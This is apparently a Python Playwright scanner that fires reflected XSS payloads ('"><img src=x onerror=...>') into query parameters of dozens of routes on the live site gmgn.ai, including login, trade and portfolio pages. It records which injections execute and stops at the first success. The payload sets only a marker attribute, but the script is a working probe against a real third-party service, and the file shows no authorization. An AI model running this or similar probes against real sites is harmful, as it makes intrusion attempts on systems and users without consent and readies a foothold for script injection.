from __future__ import annotations

import asyncio
import json
import urllib.parse
from pathlib import Path

from playwright.async_api import Browser, Page, async_playwright

BASE = "https://gmgn.ai"
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

ROUTE_PARAMS: dict[str, tuple[str, ...]] = {
    "/": ("q", "search", "ref", "invite_code", "redirect"),
    "/login": ("redirect", "redirect_url", "returnUrl", "callback", "next", "from"),
    "/tglogin": ("redirect", "callback", "code", "state", "next", "from"),
    "/rewards": ("invite_code", "referral_code", "code", "ref", "tab", "from"),
    "/invite": ("invite_code", "referral_code", "code", "ref", "from"),
    "/referral": ("invite_code", "referral_code", "code", "ref", "from"),
    "/discover": ("q", "query", "keyword", "search", "name", "symbol", "token"),
    "/trenches": ("q", "query", "keyword", "search", "name", "symbol", "token"),
    "/trade": ("chain", "address", "token", "from", "to", "redirect"),
    "/portfolio": ("address", "wallet", "chain", "tab", "q"),
    "/watchlist": ("q", "query", "search", "name", "symbol"),
    "/profile": ("address", "user", "name", "tab", "redirect"),
    "/settings": ("tab", "redirect", "callback", "message"),
}
MAX_CASES = 82
NAV_TIMEOUT_MS = 18_000
SETTLE_MS = 1_400


def build_cases() -> list[dict[str, str]]:
    cases: list[dict[str, str]] = []
    index = 0
    for route, params in ROUTE_PARAMS.items():
        for param in params:
            if len(cases) >= MAX_CASES:
                return cases
            index += 1
            marker = f"GMGNHTML{index}"
            payload = (
                '"><img src=x onerror="parent.document.documentElement.'
                f"setAttribute('data-gmgn-xss','{marker}')">"
            )
            query = urllib.parse.urlencode({param: payload})
            cases.append(
                {
                    "kind": "html-attribute",
                    "route": route,
                    "param": param,
                    "marker": marker,
                    "url": f"{BASE}{route}?{query}",
                }
            )

    return cases


async def test_case(page: Page, case: dict[str, str]) -> dict:
    dialogs: list[str] = []

    async def on_dialog(dialog) -> None:
        dialogs.append(dialog.message)
        await dialog.dismiss()

    page.on("dialog", on_dialog)
    result = {**case, "status": None, "final_url": None, "executed": False, "reflected": False, "dialogs": dialogs, "error": None}
    try:
        response = await page.goto(case["url"], wait_until="domcontentloaded", timeout=NAV_TIMEOUT_MS)
        result["status"] = response.status if response else None
        result["final_url"] = page.url
        await page.wait_for_timeout(SETTLE_MS)
        state = await page.evaluate(
            """marker => ({
                attr: document.documentElement.getAttribute('data-gmgn-xss'),
                htmlHasMarker: document.documentElement.outerHTML.includes(marker),
                imgMarkers: Array.from(document.querySelectorAll('img')).filter(img =>
                    (img.getAttribute('onerror') || '').includes(marker) ||
                    (img.outerHTML || '').includes(marker)
                ).length,
            })""",
            case["marker"],
        )
        result["executed"] = state.get("attr") == case["marker"]
        result["reflected"] = bool(state.get("htmlHasMarker") or state.get("imgMarkers"))
        result["dom_state"] = state
    except Exception as exc:  # noqa: BLE001
        result["error"] = f"{type(exc).__name__}: {exc}"
    finally:
        page.remove_listener("dialog", on_dialog)
    return result


async def run() -> dict:
    cases = build_cases()
    async with async_playwright() as playwright:
        browser: Browser = await playwright.chromium.launch(
            headless=True,
            args=["--disable-dev-shm-usage", "--no-sandbox"],
        )
        context = await browser.new_context(
            user_agent=USER_AGENT,
            ignore_https_errors=True,
            viewport={"width": 1280, "height": 900},
        )
        page = await context.new_page()
        await page.route(
            "**/*",
            lambda route: route.abort()
            if route.request.resource_type in {"font", "media"}
            else route.continue_(),
        )

        results: list[dict] = []
        for case in cases:
            result = await test_case(page, case)
            results.append(result)
            print(
                "CASE",
                json.dumps(
                    {
                        "route": result["route"],
                        "param": result["param"],
                        "status": result["status"],
                        "executed": result["executed"],
                        "reflected": result["reflected"],
                        "error": result["error"],
                    },
                    sort_keys=True,
                ),
                flush=True,
            )
            if result["executed"]:
                break
            await page.evaluate("document.documentElement.removeAttribute('data-gmgn-xss')")
            await page.wait_for_timeout(120)

        await context.close()
        await browser.close()

    executed = [result for result in results if result["executed"]]
    reflected = [result for result in results if result["reflected"]]
    return {
        "scope": "unauthenticated public GET navigation with harmless in-page marker only",
        "summary": {
            "cases_planned": len(cases),
            "cases_run": len(results),
            "executed": len(executed),
            "reflected_without_execution": len([r for r in reflected if not r["executed"]]),
            "navigation_errors": sum(1 for result in results if result["error"]),
        },
        "executed_cases": executed,
        "reflected_cases": reflected,
        "results": results,
    }


def main() -> int:
    report = asyncio.run(run())
    out = Path("gmgn_public_dom_probe.json")
    out.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    print(json.dumps(report["summary"], indent=2))
    print(f"WROTE {out} ({out.stat().st_size} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
